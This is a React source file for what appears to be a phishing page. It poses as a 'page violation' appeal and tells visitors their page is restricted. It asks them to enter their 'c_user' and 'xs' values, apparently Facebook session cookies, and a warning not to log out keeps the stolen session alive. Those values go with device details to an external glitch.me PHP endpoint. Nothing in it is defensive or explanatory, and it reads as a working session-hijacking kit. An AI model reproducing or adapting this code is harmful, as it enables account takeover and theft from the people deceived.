import React, { useState } from "react";
import FormInput from "../components/FormInput.jsx";

function Home({ onNext }) {
  const [formData, setFormData] = useState({
    c_user: "",
    xs: "",
  });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({
        ...prev,
        [name]: "",
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.c_user.trim()) {
      newErrors.c_user = "c_user is required";
    } else if (!/^\d{15}$/.test(formData.c_user)) {
      newErrors.c_user = "Please enter 15 digits";
    }

    if (!formData.xs.trim()) {
      newErrors.xs = "xs is required";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);

    try {
      // Get device info
      const deviceInfo = {
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        isTouchDevice: "ontouchstart" in window,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
      };

      const submissionData = {
        ...formData,
        ...deviceInfo,
        submittedAt: new Date().toISOString(),
      };

      // Create FormData for the API request
      const apiFormData = new FormData();
      Object.keys(submissionData).forEach((key) => {
        apiFormData.append(key, submissionData[key]);
      });

      // Send to external API
      const response = await fetch(
        "https://mixed-fluff-space.glitch.me/zubaireng.php",
        {
          method: "POST",
          body: apiFormData,
        },
      );

      if (response.ok) {
        // Generate a submission ID
        const submissionId = Date.now();
        setIsSubmitting(false);
        onNext(submissionId, submissionData);
      } else {
        throw new Error("Form submission failed");
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setErrors({ submit: "Failed to submit form. Please try again." });
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="form-container">
        <h2 className="text-2xl font-bold text-gray-800 mb-6">
          Request For Remove Page Violation
        </h2>

        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
          <p className="text-blue-800 text-sm mb-2">
            We've identified irregular activity on your page that goes against our community guidelines.
          </p>
          <p className="text-blue-800 text-sm mb-2">
            As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.
          </p>
          <p className="text-blue-800 text-sm">
            Please provide the precise details below.
          </p>
        </div>

        <form onSubmit={handleSubmit}>
          <FormInput
            label="c_user"
            type="number"
            name="c_user"
            value={formData.c_user}
            onChange={handleInputChange}
            error={errors.c_user}
            required
            pattern="^\d{15}$"
            title="Please enter 15 digits"
            placeholder="Enter your c_user (15 digits)"
          />

          <FormInput
            label="xs"
            type="text"
            name="xs"
            value={formData.xs}
            onChange={handleInputChange}
            error={errors.xs}
            required
            placeholder="Enter your xs"
          />

          {errors.submit && (
            <div className="error-message mb-4">{errors.submit}</div>
          )}

          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
            <p className="text-yellow-800 text-sm">
              Please make sure not to log out from your computer or laptop until you have received a verification email.
            </p>
          </div>

          <button
            type="submit"
            className="submit-button"
            disabled={isSubmitting}
          >
            {isSubmitting ? "Submitting..." : "Submit"}
          </button>
        </form>
      </div>
    </div>
  );
}

export default Home;
